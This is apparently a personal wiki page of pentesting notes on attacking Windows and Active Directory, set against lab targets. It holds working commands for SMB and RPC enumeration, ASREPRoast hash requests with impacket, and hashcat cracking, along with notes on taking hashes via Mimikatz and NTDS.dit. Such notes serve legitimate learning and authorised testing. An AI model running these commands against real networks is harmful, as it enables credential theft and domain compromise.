Content-Type: text/x-zim-wiki
Wiki-Format: zim 0.6
Creation-Date: 2020-02-15T18:20:27-05:00

====== Windows Exlpoitation ======
Created Saturday 15 February 2020

Elaborate pentesting guide: https://www.roguesecurity.in/2018/12/02/a-guide-for-windows-penetration-testing/
SMB pentesting guide: https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/
[[Tools:Linux:EvilWinRM]] https://blog.rapid7.com/2012/11/08/abusing-windows-remote-management-winrm-with-metasploit/
General pentesting guide: http://www.lifeoverpentest.com/
Attacking AD: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md

==== Article covering the impacket toolkit ====
https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/

Do portscan to enumerate services
Retrieve netbios information (mbtscan)
Enumerate network shares: msf > auxiliary/scanner/smb/smb_enumshares
Enumerate users: msf > scanner/smb/smb_enumusers

Use rpcclient -U "" -N <ip> to retrieve information about the system

Get userdetails from a userlist:
for i in $(cat users.txt); do rpcclient -U "" -N 10.10.10.169 -c "queryuser $i" >> user_details.txt; done

See if RPC service is leaking information: msf > use auxiliary/scanner/smb/pipe_dcerpc_auditor

Enumerate SMB shares:
smbmap -H 192.168.1.102 -d metasploitable -u msfadmin -p msfadmin

===== WinRM =====
Use evil-winrm to spawn a powershell on the remote server


===== When your user is a DNSAsmin: =====
https://adsecurity.org/?p=4064
https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83
https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2  ← Practical todo

==== Active directory attacks: ====
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md

==== Where to get hashes ====
User hashes can be extracted from SAM files in workstations or NTDS.DIT file of DCs, as well as from the lsass process memory (by using Mimikatz) where it is also possible to find cleartext passwords.

==== Getting hashses from NTDS.dit files: ====
https://medium.com/@bondo.mike/extracting-and-cracking-ntds-dit-2b266214f277

==== Attacking Kerberos from different levels of privilege ====
https://www.tarlogic.com/en/blog/how-to-attack-kerberos/



===== Kerberos related attacks =====

==== Kerberoasting ====

Kerberoasting is a technique which takes advantage of TGS to crack the user accounts passwords offline.

As seen above, TGS comes encrypted with service key, which is derived from service owner account NTLM hash. Usually the owners of services are the computers in which the services are being executed. However, the computer passwords are very complex, thus, it is not useful to try to crack those. This also happens in case of krbtgt account, therefore, TGT is not crackable neither.

All the same, on some occasions the owner of service is a normal user account. In these cases it is more feasible to crack their passwords. Moreover, this sort of accounts normally have very juicy privileges. Additionally, to get a TGS for any service only a normal domain account is needed, due to Kerberos not perform authorization checks.

==== ASREPRoast ====

More info: https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/
How to: https://burmat.gitbook.io/security/hacking/domain-exploitation

ASREPRoast is similar to Kerberoasting, that also pursues the accounts passwords cracking.

If the attribute DONT_REQ_PREAUTH is set in a user account, then it is possible to built a KRB_AS_REQ message without specifying its password.

After that, the KDC will respond with a KRB_AS_REP message, which will contain some information encrypted with the user key. Thus, this message can be used to crack the user password.

See [[Tools:Linux:ldapsearch]] for queries that extract users with this flag set

==== Getting TGT ====
python3 /opt/impacket_tools/GetNPUsers.py -request -no-pass -dc-ip <ip> <domain>/ -usersfile <users_file> ← Don't omit the slash after <domain>
<domain> is domain.tld
<users_file> Is a file with on each line a  username
<ip> duh

==== Cracking with hashcat ====
hashcat -m 18200 -a 0 --force user.hash /usr/share/wordlists/rockyou.txt


